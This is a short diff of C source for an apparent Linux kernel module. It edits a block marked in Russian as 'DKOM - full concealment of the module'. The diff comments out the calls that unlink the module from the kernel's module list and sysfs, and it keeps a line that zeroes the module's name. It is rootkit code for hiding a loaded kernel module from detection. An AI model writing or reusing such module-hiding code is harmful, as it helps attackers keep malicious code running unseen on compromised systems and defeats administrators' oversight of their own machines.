@@ -92,9 +92,9 @@ static int __init driver_entry(void) {
     }
     
     // DKOM - полное сокрытие модуля
-    list_del_init(&THIS_MODULE->list);
-    list_del_init(&THIS_MODULE->source_list);
-    kobject_del(&THIS_MODULE->mkobj.kobj);
+  //  list_del_init(&THIS_MODULE->list);
+  //  list_del_init(&THIS_MODULE->source_list);
+    //kobject_del(&THIS_MODULE->mkobj.kobj);
     memset(THIS_MODULE->name, 0, MODULE_NAME_LEN);
     
     return 0;
